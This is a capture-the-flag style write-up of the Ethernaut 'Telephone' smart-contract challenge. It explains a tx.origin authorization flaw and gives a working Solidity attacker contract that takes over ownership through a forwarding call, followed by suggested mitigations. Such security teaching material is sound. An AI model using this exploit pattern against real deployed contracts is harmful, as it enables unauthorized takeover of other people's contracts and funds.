## Objectives

1. Claim ownership of the contract.

## Vulnerabilities

### Bad access control

The critical function `changeOwner` will change the ownership if `tx.origin != msg.sender` which
can be easily recreated by anyone.

### tx.origin used for authorization

Using `tx.origin` for authorizing critical behavior can be exploited by malicious contract forwarding.

## Exploit

1. Create a malicious contract that will call `changeOwner` from the Telephone contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone target;

    constructor(address _targetAddress){
        target = ITelephone(_targetAddress);
    }

    function attack() external {
        target.changeOwner(msg.sender);
    }
}
```

2. Call the `attack` function transfer the ownership to yourself.

## Suggested mitigation

1. Remove all traces of `tx.origin` in the authorization logic since it's bad practice.
2. Adding a `onlyOwner` function modifier to `changeOwner`.
